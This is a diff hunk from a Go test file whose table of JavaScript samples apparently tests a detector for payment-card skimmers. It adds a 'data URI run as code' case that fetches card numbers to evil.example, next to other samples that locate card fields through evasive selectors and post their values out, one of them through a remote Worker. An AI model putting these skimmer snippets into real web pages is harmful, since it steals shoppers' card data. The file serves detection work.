@@ -370,6 +370,7 @@ func TestSkimmerSelectorsExitsAndData(t *testing.T) {
 		"placeholder":           `var f=document.querySelector('input[placeholder*="Card number"]')` + send,
 		"autocomplete":          `var f=document.querySelector('input[autocomplete="cc-csc"]')` + send,
 		"split id":              `var f=document.querySelector('[id^="card_n"][id$="umber"]')` + send,
+		"data URI run as code":  "setTimeout('data:;base64,0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+cardnumber.value.split().map(function(v){fetch(\"https://evil.example/p?d=\"+v)})')",
 		"split name with a gap": `var f=document.querySelector('[name^="payment[c"][name$="_number]"]')` + send,
 		"escaped id":            `var f=document.querySelector('#card\\4e umber')` + send,
 		"worker":                `var f=document.querySelector('[name="cc_number"]');new Worker('https://evil.example/w.js').postMessage(f.value)`,
